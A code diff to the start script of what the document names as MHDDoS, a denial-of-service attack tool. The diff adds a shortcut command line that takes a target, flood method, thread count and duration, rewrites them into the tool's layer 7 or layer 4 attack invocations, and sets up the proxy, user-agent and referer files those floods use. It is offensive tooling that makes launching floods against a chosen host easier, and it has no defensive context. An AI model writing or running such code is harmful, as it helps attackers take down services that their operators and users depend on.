@@ -1789,10 +1789,48 @@ def _is_simple_cli_mode():
     return False
 
 
+
+def _setup_simple_files():
+    """Ensure required files exist for simple CLI mode (no proxy)."""
+    import os
+    ua_file = __dir__ / "files/useragent.txt"
+    ref_file = __dir__ / "files/referers.txt"
+    proxy_dir = __dir__ / "files/proxies"
+    os.makedirs(proxy_dir, exist_ok=True)
+    for pf in ["http.txt", "socks4.txt", "socks5.txt"]:
+        pp = proxy_dir / pf
+        if not pp.exists():
+            pp.write_text("")
+    if not ua_file.exists():
+        ua_file.write_text("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36\n")
+    if not ref_file.exists():
+        ref_file.write_text("https://www.google.com/\n")
+
+
 if __name__ == '__main__':
-    # Detect simple CLI mode vs original mode
-    if _is_simple_cli_mode():
-        _simple_cli()
+    # === Simple CLI: python3 start.py <TARGET> <METHOD> <THREADS> <DURATION> ===
+    # Auto-converts to MHDDoS native format. Original format still works.
+    if len(argv) == 5 and argv[1].upper() not in ("HELP", "TOOLS", "STOP"):
+        _target_raw = argv[1].strip()
+        if not _target_raw.startswith("http"):
+            _target_raw = "http://" + _target_raw
+        _method = argv[2].upper()
+        _threads = int(argv[3])
+        _duration = int(argv[4])
+
+        if _method not in Methods.ALL_METHODS:
+            exit("Method Not Found: %s\nAvailable: %s" % (_method, ", ".join(Methods.ALL_METHODS)))
+
+        _setup_simple_files()
+
+        if _method in Methods.LAYER7_METHODS:
+            # L7: METHOD URL PROXY_TYPE THREADS PROXY_LIST RPC TIMER
+            argv = [argv[0], _method, _target_raw, "0", str(_threads), "http.txt", "100", str(_duration)]
+        else:
+            # L4: METHOD URL THREADS TIMER
+            argv = [argv[0], _method, _target_raw, str(_threads), str(_duration)]
+
+        logger.info(f"[Simple CLI] Rewritten argv: {' '.join(argv[1:])}")
 
     with suppress(KeyboardInterrupt):
         with suppress(IndexError):
